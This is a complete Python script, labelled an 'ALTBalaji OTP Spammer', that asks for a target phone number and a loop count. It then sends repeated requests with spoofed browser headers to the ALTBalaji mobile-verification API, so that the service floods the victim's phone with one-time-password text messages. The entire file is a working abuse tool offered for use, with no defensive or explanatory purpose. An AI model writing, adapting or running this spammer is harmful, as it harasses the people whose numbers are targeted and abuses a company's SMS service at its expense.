import os, sys, json, requests, time

class Bala:
	def __init__(self):
		self.u="https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
		self.unum()

	def unum(self):
		kod=input("your country code (without +): ")
		nom=input(f"your target num: +{kod} ")
		jum=int(input("looping: "))
		for i in range(jum):
			res=self.send(kod,nom)
			if '{"status":"ok"}' in res:
				print(f"{i+1}. Success")
			else:
				print(f"{i+1}. Failed\n- Detail: {res}")
			time.sleep(1)

	def send(self,kod,nom):
		ata={"country_code":kod,"phone_number":nom}
		head={"Connection":"keep-alive",
			"Content-Length":f"{len(str(ata))}",
			"Accept":"application/json, text/plain, */*",
			"Origin":"https://lite.altbalaji.com",
			"Save-Data":"on",
			"User-Agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36",
			"Content-Type":"application/json;charset=UTF-8",
			"Referer":"https://lite.altbalaji.com/subscribe?progress=input",
			"Accept-Encoding":"gzip, deflate, br",
			"Accept-Language":"en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6",
			}
		req=requests.post(self.u,data=json.dumps(ata),headers=head)
		return req.text

try:
	os.system('clear')
	print("""
	# ALTBalaji OTP Spammer #
	    ~ By Kang-newbie ~
	""")
	Bala()

	while True:
		pil=input("\ntry again (y/n)?")
		if pil.lower() == "y":
			print()
			Bala()
		else:
			sys.exit("Bye Bye :*")
except Exception as Err:
	print(f"Err: {Err}")
